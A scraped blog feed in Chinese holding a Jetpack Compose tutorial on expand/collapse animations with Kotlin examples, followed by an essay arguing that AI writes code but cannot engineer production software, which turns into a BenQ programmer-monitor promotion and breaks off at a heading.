src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/64b2a54f63f94ca7a3529032a1b7e8f2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764636993&amp;x-signature=bL%2BUaRKB%2BMIDFnmKPgGF8nenGDc%3D" alt="0.png" loading="lazy"/></p>
<p>假设你正在使用 Jetpack Compose 构建一个屏幕界面，并且希望实现某些内容的展开或收起效果 —— 比如常见问题解答部分、下拉面板或筛选菜单。</p>
<p>你可能会想：</p>
<p>我要如何实现平滑的过渡效果呢？</p>
<p>好消息是：Jetpack Compose 让这个需求变得相当容易实现。</p>
<p>该篇文章，让我为大家详细介绍处理展开/收起动画的所有实用方法 —— 每种方法都适用于不同的用例。</p>
<h2 data-id="heading-0">高度的平滑增长</h2>
<p>假设你有一个方块，当用户点击它时，下方会显示一些内容，而你希望整个过程能够自然展开，不出现跳动。</p>
<p>对于这种情况，Jetpack Compose 有一个非常实用的修饰符：<code>animateContentSize()</code>。</p>
<p>下面是一个简单的示例：</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">ExpandableBox</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">var</span> expanded <span class="hljs-keyword">by</span> remember { mutableStateOf(<span class="hljs-literal">false</span>) }
    Column(modifier = Modifier
        .clickable { expanded = !expanded }
        .background(Color.DarkGray)
        .padding(<span class="hljs-number">16.</span>dp)
        .animateContentSize() <span class="hljs-comment">// 高度变化产生动画</span>
    ) {
        Text(<span class="hljs-string">"Q: What is Compose?"</span>, color = Color.White)
        <span class="hljs-keyword">if</span> (expanded) {
            Text(
                <span class="hljs-string">"A: It's a modern UI toolkit for Android that replaces XML."</span>, color = Color.LightGray, modifier = Modifier.padding(top = <span class="hljs-number">8.</span>dp)
            )
        }
    }
}
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3e8abbf6e52f48849732afa0b3e768d3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764636993&amp;x-signature=jXMRnachA4o%2BMvAIOEMsoRKgLHk%3D" alt="11.gif" loading="lazy"/></p>
<p>只需要这一个修饰符——就这样，每当高度发生变化时，就能实现平滑过渡。</p>
<p>当然，它的工作原理实际上是这样的：</p>
<p>当你将 <code>animateContentSize</code> 应用到一个 <code>Composable</code> 上时，Compose 会监听该组件内容宽高的变化。如果内容尺寸发生变化（例如，因为内部文本变长、子元素增删等），它会自动在旧尺寸和新尺寸之间执行一个平滑的过渡动画。</p>
<h2 data-id="heading-1">淡入淡出与滑动</h2>
<p>如果你不只是想增加高度，还希望内容在可见时淡入、滑入或放大。</p>
<p>这就来到了 <code>AnimatedVisibility()</code> 的用武之地。</p>
<p>假设你有一个用于显示/隐藏面板的切换按钮。以下是如何巧妙地实现动画效果：</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">ToggleInfoPanel</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">var</span> show <span class="hljs-keyword">by</span> remember { mutableStateOf(<span class="hljs-literal">true</span>) }
    
    Column(modifier = Modifier.padding(<span class="hljs-number">16.</span>dp)) {
        Button(onClick = { show = !show }) {
            Text(<span class="hljs-keyword">if</span> (show) <span class="hljs-string">"Hide Info"</span> <span class="hljs-keyword">else</span> <span class="hljs-string">"Show Info"</span>)
        }
        AnimatedVisibility(
            visible = show, enter = fadeIn() + slideInVertically(), exit = fadeOut() + slideOutVertically()
        ) {
            Box(
                Modifier
                    .fillMaxWidth()
                    .background(Color.Magenta)
                    .padding(<span class="hljs-number">16.</span>dp)
            ) {
                Text(<span class="hljs-string">"This is a toggleable info section"</span>, color = Color.White)
            }
        }
    }
}
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47b901f4c52f41f4ae75b4bac16b8928~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764636993&amp;x-signature=Z4uYBkiHbGu2XDjbcrGRJM%2Bf%2FFU%3D" alt="2.gif" loading="lazy"/></p>
<p>在这里，你控制的是它如何出现或消失，而不仅仅是它是否显示。</p>
<p><code>AnimatedVisibility()</code> 包裹另一个 <code>Composable</code>，并根据其 <code>visible</code> 的值（<code>true</code>/<code>false</code>）来决定是否显示内部内容。当 <code>visible</code> 状态改变时，它会自动执行指定的进入动画或退出动画。</p>
<h2 data-id="heading-2">垂直展开/收起的滑动面板</h2>
<p>假设你正在构建一个筛选下拉菜单或手风琴式部分，并且希望它在展开时从顶部向下滑动打开，在收起时向上收缩回去。</p>
<p>你可以在 <code>AnimatedVisibility()</code> 中使用 <code>expandVertically()</code> 和 <code>shrinkVertically()</code>：</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">FilterDropdown</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">var</span> expanded <span class="hljs-keyword">by</span> remember { mutableStateOf(<span class="hljs-literal">false</span>) }
    Column(modifier = Modifier.padding(<span class="hljs-number">16.</span>dp)) {

        Text(<span class="hljs-string">"Filters"</span>, modifier = Modifier
            .clickable { expanded = !expanded }
            .background(Color.Gray)
            .padding(<span class="hljs-number">12.</span>dp), color = Color.White)

        AnimatedVisibility(
            visible = expanded, enter = expandVertically(), exit = shrinkVertically()
        ) {
            Column(
                Modifier
                    .fillMaxWidth()
                    .background(Color.LightGray)
                    .padding(<span class="hljs-number">16.</span>dp)
            ) {
                Text(<span class="hljs-string">"Sort by Price"</span>)
                Text(<span class="hljs-string">"Sort by Rating"</span>)
                Text(<span class="hljs-string">"Sort by Availability"</span>)
            }
        }
    }
}
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aa5d12b179b749daad88cd609a0b53dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764636993&amp;x-signature=GYby4y4yqCPFI7NVixaAHXdmlNA%3D" alt="3.gif" loading="lazy"/></p>
<p>流畅的垂直滑动效果，非常适合可展开的面板。</p>
<h2 data-id="heading-3">多个元素的动画</h2>
<p>如果你想让高度、背景颜色和透明度在展开时同步进行动画处理，该怎么做呢？</p>
<p>轮到 <code>updateTransition()</code> 大显身手了。它的使用稍微复杂一些，但能让你完全掌控动画效果：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">FancyExpandBox</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">var</span> expanded <span class="hljs-keyword">by</span> remember { mutableStateOf(<span class="hljs-literal">false</span>) }
    <span class="hljs-keyword">val</span> transition = updateTransition(targetState = expanded, label = <span class="hljs-string">"transition"</span>)
    <span class="hljs-keyword">val</span> txtSize <span class="hljs-keyword">by</span> transition.animateInt(label = <span class="hljs-string">"text"</span>) {
        <span class="hljs-keyword">if</span> (it) <span class="hljs-number">24</span> <span class="hljs-keyword">else</span> <span class="hljs-number">14</span>
    }
    <span class="hljs-keyword">val</span> height <span class="hljs-keyword">by</span> transition.animateDp(label = <span class="hljs-string">"height"</span>) {
        <span class="hljs-keyword">if</span> (it) <span class="hljs-number">200.</span>dp <span class="hljs-keyword">else</span> <span class="hljs-number">60.</span>dp
    }
    <span class="hljs-keyword">val</span> bgColor <span class="hljs-keyword">by</span> transition.animateColor(label = <span class="hljs-string">"color"</span>) {
        <span class="hljs-keyword">if</span> (it) Color.Blue <span class="hljs-keyword">else</span> Color.Gray
    }
    <span class="hljs-keyword">val</span> alpha <span class="hljs-keyword">by</span> transition.animateFloat(label = <span class="hljs-string">"alpha"</span>) {
        <span class="hljs-keyword">if</span> (it) <span class="hljs-number">1f</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0.5f</span>
    }
    Box(
        modifier = Modifier
            .clickable { expanded = !expanded }
            .fillMaxWidth()
            .height(height)
            .background(bgColor.copy(alpha = alpha))
            .padding(<span class="hljs-number">16.</span>dp)
    ) {
        Text(<span class="hljs-string">"Tap to expand or collapse"</span>, color = Color.White, fontSize = txtSize.sp)
    }
}
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47ab002bcdb04b9aa4d72fc3b6a09ff3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764636993&amp;x-signature=0jUVQU9C1p9GBfW5FLF%2Fuc9V0yw%3D" alt="4.gif" loading="lazy"/></p>
<p><em>该方法需要添加 <code>androidx.compose.animation:animation-core</code> 依赖。</em></p>
<p>你可以在这里对任何属性进行动画处理 —— 边距、形状、文字大小 —— 它们都会一起过渡变化。</p>
<p><code>updateTransition</code> 是一个状态驱动的动画协调器。它通过观察一个关键状态的变化，自动管理一组相关视觉属性的动画，将它们从旧状态的目标值流畅地过渡到新状态的目标值，非常适合处理复杂的、多步骤的 UI 状态切换动画。</p>
<h2 data-id="heading-4">为布局权重做动画</h2>
<p>如果你有两个面板并排放置或垂直堆叠，并且希望一个面板变大而另一个面板变小 —— 那就对权重进行动画处理！</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">WeightAnimationDemo</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">var</span> expanded <span class="hljs-keyword">by</span> remember { mutableStateOf(<span class="hljs-literal">false</span>) }
    <span class="hljs-keyword">val</span> weight <span class="hljs-keyword">by</span> animateFloatAsState(targetValue = <span class="hljs-keyword">if</span> (expanded) <span class="hljs-number">0.8f</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0.3f</span>)
    Column(modifier = Modifier.height(<span class="hljs-number">200.</span>dp)) {
        Box(
            modifier = Modifier
                .weight(weight)
                .fillMaxWidth()
                .background(Color.Blue)
                .clickable { expanded = !expanded })
        Box(
            modifier = Modifier
                .weight(<span class="hljs-number">1f</span> - weight)
                .fillMaxWidth()
                .background(Color.DarkGray)
        )
    }
}
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7de6907433c345b494afb5efa2a24d16~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764636993&amp;x-signature=VKU%2BRViYZTo%2FR2c3ssKTFGFc114%3D" alt="5.gif" loading="lazy"/></p>
<p>点击顶部框会平滑地调整两个部分的大小。</p>
<h2 data-id="heading-5">总结</h2>
<ul>
<li>如果你的视图只是大小发生增长或缩小 —— <code>animateContentSize()</code>。</li>
<li>如果你想要淡入、滑动或缩放动画 —— <code>AnimatedVisibility()</code>。</li>
<li>对于更高级的布局变化或组合效果 —— <code>updateTransition()</code>。</li>
<li>想要使用布局权重调整大小？ —— <code>animateFloatAsState()</code>。</li>
</ul>
<p>一旦你熟悉了这些工具，你会发现在 Compose 中构建大多数展开/收起的用户界面变得超级直观 —— 而且它们比使用 <code>XML</code> 时更加流畅，更加直观，更加方便。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI 能写代码，但它造不出软件]]></title>    <link>https://juejin.cn/post/7576165316250566665</link>    <guid>https://juejin.cn/post/7576165316250566665</guid>    <pubDate>2025-11-25T01:00:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576165316250566665" data-draft-id="7576105442214002738" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI 能写代码，但它造不出软件"/> <meta itemprop="keywords" content="AI编程,前端,后端"/> <meta itemprop="datePublished" content="2025-11-25T01:00:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="XCaptaino"/> <meta itemprop="url" content="https://juejin.cn/user/3052665287739005"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI 能写代码，但它造不出软件
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3052665287739005/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    XCaptaino
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-25T01:00:33.000Z" title="Tue Nov 25 2025 01:00:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-25
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">AI 能写代码，但它造不出软件</h2>
<p>最近，我收到越来越多这样的消息：陌生人发来一段 AI 生成的代码，问"能帮我把它变成产品吗？"</p>
<p>发信人往往是律师、销售、医生，甚至咖啡店老板。他们没写过一行生产代码，却用 AI 工具在周末拼出了能跑的 demo。界面亮眼、交互顺畅、功能看似齐全——至少在本地机器上是这样。</p>
<p>然后，他们卡住了。卡在"上线"两个字上。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6fd78731bc4b4d59a4dd960ab80bf4d3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWENhcHRhaW5v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764637233&amp;x-signature=04Q%2BAkRnt0mLUNjqgZheOxXrpo8%3D" alt="" loading="lazy"/></p>
<p>于是他们满世界找技术合伙人、CTO、外包团队，愿意用股权、现金、分成换一个承诺：把这个玩具变成生意。</p>
<p>这让我反复问自己——如果 AI 真能取代软件工程师，为什么这些人还需要我们？</p>
<p>答案很简单： <strong>关键在于：AI 会写代码，但它不那么会构建软件。</strong></p>
<p>这是我花了大量时间用 AI 辅助编程、看了无数演示后得出的结论。</p>
<p>圈内有句老话：写代码容易，软件工程难。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/57b56deecbbb4431af061bcc3451284e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWENhcHRhaW5v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764637233&amp;x-signature=qkS%2B55XKn9%2FdoCITtBjuaqAcJNQ%3D" alt="" loading="lazy"/></p>
<p>大语言模型已经能自动化"大量写代码"的工作。像 GPT-5 这样的模型（这里指未来更强的模型），在解决定义清晰、独立的小问题时，成功率相当高。</p>
<p>但"写代码"本身不是大多数程序员拿工资的真正原因。构建一个能正式上线的 App，那不叫"写代码"，那叫"软件工程"。</p>
<p>当你试图把"演示版"变成"真正的产品"时，"写代码"就升级成了"软件工程"——这正是那些人带着项目来找你的原因。</p>
<p>我其实也不太清楚为什么 AI 目前还无法"构建软件"。</p>
<p>也许这和工作的本质有关。当你以写软件为生时，核心任务是处理"复杂性"。一个普通的线上产品，可能只是做一堆简单的事。真正的挑战是：如何让成百上千件简单的事同时不出错地运行，并让整个系统保持可维护性。</p>
<p>换到 AI 的话题下：演示一个"功能"是一回事；用一种支持集成、扩展和长期可维护的方式"构建"这个功能，则完全是另一回事，难度天差地别。</p>
<p>当你点开那些人发来的代码时，你会发现，所谓的"让 App 生产就绪"，真正的意思是"把这些代码全删了，从头重写"。</p>
<p>这清楚地说明了我们在 AI 发展上目前所处的阶段。</p>
<h3 data-id="heading-1">代码 ≠ 软件</h3>
<p>写代码从来不是软件工程里最难的部分。把明确定义的小任务拆成函数、补全语法、跑通单元测试——今天的 AI 已经炉火纯青。你给它一个 user story,它能吐出结构清晰、类型标注、测试覆盖的代码,速度比大多数 junior 快十倍。</p>
<p>但软件不是代码的堆叠。</p>
<p>软件是一座城市:</p>
<ul>
<li>有下水道(错误处理、日志、监控)</li>
<li>有供电系统(部署、扩容、降级)</li>
<li>有消防通道(安全、合规、审计)</li>
<li>有城市规划(架构、分层、演进路径)</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1d343d8832da4f7c81b82a6cc76c806a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWENhcHRhaW5v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764637233&amp;x-signature=ZMqApy0rQLmCF8ZdSg7ET38ytAg%3D" alt="" loading="lazy"/></p>
<p>AI 能给你盖一栋漂亮的别墅模型,3D 渲染、灯光效果、VR 漫游一应俱全。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c27e26a8ce2744059971a547b08e5a60~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWENhcHRhaW5v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764637233&amp;x-signature=eCmhvZ5mB301nNNT13v9fhgyiX8%3D" alt="" loading="lazy"/></p>
<p>可它不会告诉你:地基能不能扛台风?消防通道够不够宽?那些找上门的人,拿来的正是这种"模型房"。</p>
<p>运行在 localhost:3000,依赖本地 SQLite,硬编码 API key,错误直接 console.log。它能演示,却经不起风吹雨打。</p>
<h3 data-id="heading-2">复杂度管理，是人类的专属能力</h3>
<p>软件工程的核心不是"写"，而是"管"——管理复杂度。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/31f12fa531bc4f69882b0a83b75417d7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWENhcHRhaW5v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764637233&amp;x-signature=gFQFRKku4u7Pmy9uV4WSXzgznH8%3D" alt="" loading="lazy"/> 一个生产系统往往由几百个"简单"模块组成。单独看，每个模块都平平无奇：用户登录、库存扣减、消息推送。</p>
<p>但要让它们同时跑起来，还要满足：99.99% 可用性、峰值 10 万 QPS、数据最终一致、支持多地区部署、平滑升级不掉单、出错秒级回滚、成本控制在预算内；这是几百个"简单"必须同时满足的约束条件。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82ead615c0994d72a572c663d345351a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWENhcHRhaW5v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764637233&amp;x-signature=MafvAl2o4auZQTZkmmtV%2FbacQhk%3D" alt="" loading="lazy"/></p>
<p>AI 能解决其中一个，却无法同时满足全部——因为它缺乏"整体观"。</p>
<p>它不知道：这个缓存失效策略在双十一会引发雪崩、这个数据库索引在数据倾斜时会锁表、这个第三方 SDK 在 iOS 18 上会闪退；这些知识不在训练数据里，而在无数次深夜排障的肌肉记忆里。</p>
<h3 data-id="heading-3">AI 是超级实习生，不是建筑师</h3>
<p>把 AI 想象成一个顶尖的实习生：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/191bfb83e6c54ee1b4490bade4090a9e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWENhcHRhaW5v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764637233&amp;x-signature=IbT3fxZMvuh0hIZYbKfsVRLbZiU%3D" alt="" loading="lazy"/></p>
<p>你让它实现"用户上传头像"，它会给你一个完美封装的函数。但它不会问：图片要不要压缩？存储用 S3 还是 CDN？热点怎么缓存？违规内容怎么审核？</p>
<p>这些不是"代码问题"，而是"系统问题"。</p>
<p>它们横跨产品、运维、安全、财务、法务多个领域。AI 缺乏跨部门的上下文，也没有权衡利弊的能力。</p>
<h3 data-id="heading-4">门槛没有降低，只是前移了</h3>
<p>AI 把"写代码"的门槛拉到几乎为零，却把"定义问题"的门槛抬高了十倍。</p>
<p>过去，想法 → 代码的链路被技术能力卡住。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/938b0d77713f4df9ac45169ff1056088~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWENhcHRhaW5v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764637233&amp;x-signature=iXeoH757a5HTo2m%2Boxjjv7Z%2FcAc%3D" alt="" loading="lazy"/></p>
<p>现在，想法 → demo 只需一个周末。但 demo → 产品的链路，依然被复杂度管理卡死。</p>
<p>那些非技术创始人用 AI 跳过了第一道关卡，却撞上了第二道更高、更硬的墙。他们需要的不是"会写代码的人"，而是"能把复杂度转化为可持续系统的人"。</p>
<h3 data-id="heading-5">未来的分水岭</h3>
<p>AI 不会取代软件工程师，但会重新定义这个职业。</p>
<p>未来的顶尖工程师不是写最多代码的人，而是：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e4bc13fe62184a8096664aaeb587bad0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWENhcHRhaW5v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764637233&amp;x-signature=E8kWXIRSpWjABE%2FZar3cElFnSsg%3D" alt="" loading="lazy"/></p>
<p>AI 会成为他们的超级杠杆：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/68d0741a7b964615b3009e8a7d3acbe7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWENhcHRhaW5v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764637233&amp;x-signature=qJsBXCu6H028RsbKPb0Y%2FJNDTdQ%3D" alt="" loading="lazy"/></p>
<p>但杠杆再长,方向盘还得握在人手里。</p>
<h2 data-id="heading-6">扛得住这些的,从来不是 AI,而是人</h2>
<p>是那些深夜两点半,把屏幕亮度调到最低、环境漆黑一片、却还要跟 bug 死磕到底的程序员。</p>
<p>可大多数显示器根本不懂你们。</p>
<p>它们只知道"亮度越高越好",却不知道程序员最怕屏幕反光、蓝光刺眼、代码颜色分不清。</p>
<p>所以明基做了全球第一台真正为程序员设计的显示器——RD 系列。</p>
<p>我是个用了十几年显示器的 coder,也是深度 AI 编程党。今天聊聊我这一周每天对着它敲代码、看文档、熬夜改 Bug 的真实感受。</p>
<p>先说结论:如果你每天对着电脑超过 8 小时,尤其是写代码、搞算法、做 AI、玩多机切换,明基 RD 系列真能让你舒服到起飞。我入手的是 RD280U(28 英寸 3:2 4K),还有 RD320U(31.5 英寸)。真实感受就是——终于不用再忍受 16:9 的"扁平地狱"了。</p>
<h3 data-id="heading-7">为什么 3:2 这么香?</h3>
